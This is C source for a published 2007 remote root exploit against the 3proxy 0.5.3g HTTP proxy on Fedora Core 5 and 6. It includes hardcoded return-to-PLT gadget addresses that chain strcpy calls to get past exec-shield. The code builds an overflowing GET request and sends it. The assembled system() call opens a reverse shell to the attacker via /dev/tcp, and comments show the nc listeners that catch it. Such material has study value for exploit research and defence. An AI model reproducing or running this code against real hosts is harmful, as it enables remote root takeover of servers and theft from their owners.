/*
**
** Fedora Core 5,6 (exec-shield) based
** 3proxy HTTP Proxy (3proxy-0.5.3g.tgz) remote overflow root exploit
** (reverse connect-back method) by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** Reference: http://www.securityfocus.com/bid/23545
** vendor: http://3proxy.ru/
**
** vade79/v9 v9@fakehalo.us (fakehalo/realhalo)'s exploit:
** http://www.milw0rm.com/exploits/3821 (x3proxy.c)
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** It is a relatively easy exploit case.
** It doesn't need any exec family functions or manipulating address of 
** system() function, popen() function. 
**
** It just needs simple set of strings to make a connect-back shell.
** for some hosts that don't have netcat, we organize attack code like this.
**
** --
** (gdb) x/s 0x08051e5c
** 0x8051e5c:       "sh</dev/tcp/8282828282/56789>/dev/tcp/8282828282/5678"
** (gdb)
** --
**
** Let the 56789 port of attacker's server be opened and 
** when the attack is succeed hacker can SEND a COMMAND through the port.
**
** --
** $ nc -l -p 56789
** --
**
** Now, we open another port(this time 5678) on attacker's server and 
** when the attack is succeed hacer can GET a RESULT through the port.
**
** --
** $ nc -l -p 5678
** --
**
** It's very simple and easy!
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

/*
** Fedora Core release 6 (Zod)
** 2.6.18-1.2798.fc6 #1
** locale (GNU libc) 2.5
** gcc version 4.1.1 20061011 (Red Hat 4.1.1-30)
** 3proxy HTTP Proxy 0.5.3g tarball src compile (3proxy-0.5.3g.tgz)
*/
#define FC6_STRCPY_PLT		0x08048e3c // <strcpy@plt>
#define FC6_MOVE_ESP		0x0804f7c5 // <__do_global_ctors_aux> epilogue

#define FC6_CMD_LOC		0x08051e5c
#define FC6_NULL_STR		0x08051e4c // 0x00000000

#define FC6_NUM			0x08050d74 // "0"
#define FC6_SH_STR		0x08048703 // "fflush"
#define FC6_REDIR_1		0x080481ec // "<\0"
#define FC6_REDIR_2		0x0804e49b // ">\0"
#define FC6_SLASH_STR		0x08050d7f // "/\0"
#define FC6_DEV_STR1		0x08050d5d // "de"
#define FC6_DEV_STR2		0x08050d6f // "v"
#define FC6_TCP_STR1		0x0805065f // "/t"
#define FC6_TCP_STR2		0x08048709 // "strcpy"
#define FC6_PORT_56789		0x08050d79 // "56789+/"

#define FC6_SYSTEM_PLT		0x08048cbc // <system@plt>

/*
** Fedora Core release 5 (Bordeaux)
** 2.6.15-1.2054_FC5 #1
** locale (GNU libc) 2.4
** gcc version 4.1.0 20060304 (Red Hat 4.1.0-3)
** 3proxy HTTP Proxy 0.5.3g tarball src compile (3proxy-0.5.3g.tgz)
*/
#define FC5_STRCPY_PLT		0x08049194 // <strcpy@plt>
#define FC5_MOVE_ESP		0x0804f9a6 // <__do_global_ctors_aux> epilogue

#define FC5_CMD_LOC		0x08051e5c
#define FC5_NULL_STR		0x08051e4c // 0x00000000

#define FC5_NUM			0x08050f54 // "0"
#define FC5_SH_STR		0x08048938 // "fflush"
#define FC5_REDIR_1		0x080495bc // "<\0"
#define FC5_REDIR_2		0x0804e68b // ">\0"
#define FC5_SLASH_STR		0x08049ec3 // "/\0"
#define FC5_DEV_STR1		0x08050f3d // "de"
#define FC5_DEV_STR2		0x08050f4f // "v"
#define FC5_TCP_STR1		0x0805083b // "/t"
#define FC5_TCP_STR2		0x080488e4 // "strcpy"
#define FC5_PORT_56789		0x08050f59 // "56789+/"

#define FC5_SYSTEM_PLT		0x08048ed4 // <system@plt>

int main(int argc,char *argv[]){
	u_long strcpy_plt;
	u_long move_esp;
	u_long cmd_loc;
	u_long null_str;
	u_long num;
	u_long sh_str;
	u_long redir_1;
	u_long redir_2;
	u_long slash_str;
	u_long dev_str1;
	u_long dev_str2;
	u_long tcp_str1;
	u_long tcp_str2;
	u_long port_56789;
	u_long system_plt;

	struct hostent *se;
	struct sockaddr_in saddr;
	unsigned char do_ex[4096];
	int i,l,sock;
	u_long ip,ip1,ip2,ip3,ip4;
	unsigned char attacker_ip[256];
	char host[256];
	int port=3128;

	ip=ip1=ip2=ip3=ip4;
	memset((char *)do_ex,0,sizeof(do_ex));

	printf("/*\n**\n** Fedora Core 5,6 (exec-shield) based\n"
		"** 3proxy HTTP Proxy (3proxy-0.5.3g.tgz) remote overflow root exploit\n"
		"** by Xpl017Elz\n**\n");
	if(argc<5){
		printf("** Usage: %s [host] [port] [attacker ip] [type]\n",argv[0]);
		printf("**\n** host: 3proxy HTTP Proxy server\n");
		printf("** port: default 3128\n");
		printf("** attacker ip: attacker netcat host\n");
		printf("** type: {0} - Fedora Core release 5 (Bordeaux), exec-shield default enabled.\n");
		printf("**       {1} - Fedora Core release 6 (Zod), exec-shield default enabled.\n**\n");
		printf("** Example: %s 3proxy.use_host.co.kr 3128 82.82.82.82 1\n**\n*/\n",argv[0]);
		exit(-1);
	}
	if(atoi(argv[4])){
		strcpy_plt=FC6_STRCPY_PLT;
		move_esp=FC6_MOVE_ESP;
		cmd_loc=FC6_CMD_LOC;
		null_str=FC6_NULL_STR;
		num=FC6_NUM;
		sh_str=FC6_SH_STR;
		redir_1=FC6_REDIR_1;
		redir_2=FC6_REDIR_2;
		slash_str=FC6_SLASH_STR;
		dev_str1=FC6_DEV_STR1;
		dev_str2=FC6_DEV_STR2;
		tcp_str1=FC6_TCP_STR1;
		tcp_str2=FC6_TCP_STR2;
		port_56789=FC6_PORT_56789;
		system_plt=FC6_SYSTEM_PLT;
	} else {
		strcpy_plt=FC5_STRCPY_PLT;
		move_esp=FC5_MOVE_ESP;
		cmd_loc=FC5_CMD_LOC;
		null_str=FC5_NULL_STR;
		num=FC5_NUM;
		sh_str=FC5_SH_STR;
		redir_1=FC5_REDIR_1;
		redir_2=FC5_REDIR_2;
		slash_str=FC5_SLASH_STR;
		dev_str1=FC5_DEV_STR1;
		dev_str2=FC5_DEV_STR2;
		tcp_str1=FC5_TCP_STR1;
		tcp_str2=FC5_TCP_STR2;
		port_56789=FC5_PORT_56789;
		system_plt=FC5_SYSTEM_PLT;
	}

	sscanf(argv[3],"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
#define IP1 16777216
#define IP2 65536
#define IP3 256
	ip=0;
	ip+=ip1 * (IP1);
	ip+=ip2 * (IP2);
	ip+=ip3 * (IP3);
	ip+=ip4;

	memset((char *)attacker_ip,0,256);
	sprintf(attacker_ip,"%10lu",ip);

	memset((char *)host,0,sizeof(host));
	strncpy(host,argv[1],sizeof(host)-1);
	port=atoi(argv[2]);
	
	se=gethostbyname(host);
	if(se==NULL){
		printf("** gethostbyname() error\n**\n*/\n");
		return -1;
	}
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		printf("** socket() error\n**\n*/\n");
		return -1;
	}

	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(port);
	saddr.sin_addr=*((struct in_addr *)se->h_addr);
	bzero(&(saddr.sin_zero),8);

	printf("** make exploit\n");
	sprintf(do_ex,"GET /");
	l=strlen(do_ex);
	for(i=0;i<1800-444;i++,l++){
		sprintf(do_ex+l,"A");
	}

#define __GOGOSSING(dest,index,src){\
	*(long *)&dest[index]=src;\
	index+=4;\
}

	l=0;
	__GOGOSSING(do_ex,i,move_esp); /* 0x0d filter */
	__GOGOSSING(do_ex,i,0x0d0d0d0d);
	__GOGOSSING(do_ex,i,0x0d0d0d0d);

	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,sh_str);
	l+=2; /* "sh" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,redir_1);
	l+=1; /* ">" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,slash_str);
	l+=1; /* "/" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,dev_str1);
	l+=2; /* "de" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,dev_str2);
	l+=1; /* "v" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,tcp_str1);
	l+=2; /* "/t" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,tcp_str2);
	l+=2; /* "cp" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,slash_str);
	l+=1; /* "/" */

	/* IP address part */
	for(ip=0;ip<10;ip++){
		__GOGOSSING(do_ex,i,strcpy_plt);
		__GOGOSSING(do_ex,i,move_esp);
		__GOGOSSING(do_ex,i,cmd_loc+l);
		
		switch(attacker_ip[ip]){
			case '0':
				__GOGOSSING(do_ex,i,num);
				break;
			case '1':
				__GOGOSSING(do_ex,i,num+1);
				break;
			case '2':
				__GOGOSSING(do_ex,i,num+2);
				break;
			case '3':
				__GOGOSSING(do_ex,i,num+3);
				break;
			case '4':
				__GOGOSSING(do_ex,i,num+4);
				break;
			case '5':
				__GOGOSSING(do_ex,i,num+5);
				break;
			case '6':
				__GOGOSSING(do_ex,i,num+6);
				break;
			case '7':
				__GOGOSSING(do_ex,i,num+7);
				break;
			case '8':
				__GOGOSSING(do_ex,i,num+8);
				break;
			case '9':
				__GOGOSSING(do_ex,i,num+9);
				break;
		}
		l+=1;
	}
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,slash_str);
	l+=1; /* "/" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,port_56789);
	l+=5; /* "56789" */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,redir_2);
	l+=1; /* ">" */
	
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,null_str);
	/* null */
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,null_str-40);
	__GOGOSSING(do_ex,i,cmd_loc+3);
	/* copy, "/dev/tcp/ip_addr/port" */
	
	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,null_str-40);
	l+=24; /* "/dev/tcp/ip_addr/port" */

	__GOGOSSING(do_ex,i,strcpy_plt);
	__GOGOSSING(do_ex,i,move_esp);
	__GOGOSSING(do_ex,i,cmd_loc+l);
	__GOGOSSING(do_ex,i,null_str); /* port number: 5678 */

	/* system() plt */
	__GOGOSSING(do_ex,i,system_plt);
	__GOGOSSING(do_ex,i,0x82828282);
	__GOGOSSING(do_ex,i,cmd_loc);

	sprintf(do_ex+i,"\nHost: ");
	i=strlen(do_ex);
	for(l=0;l<700;l++){
		do_ex[i++]='A';
	}
	do_ex[i++]='\n';
	do_ex[i++]='\n';
	printf("** total packet size: %d\n",strlen(do_ex));

	l=connect(sock,(struct sockaddr *)&saddr,sizeof(struct sockaddr));
	if(l==-1){
		printf("** connect() error\n**\n*/\n");
		return -1;
	}
	else {
		printf("** send exploit\n");
		send(sock,do_ex,i,0);
	}
	close(sock);
	printf("** attacker host, check it up, now!\n**\n*/\n");	
	exit(0);
}

/* eox */

// milw0rm.com [2007-05-02]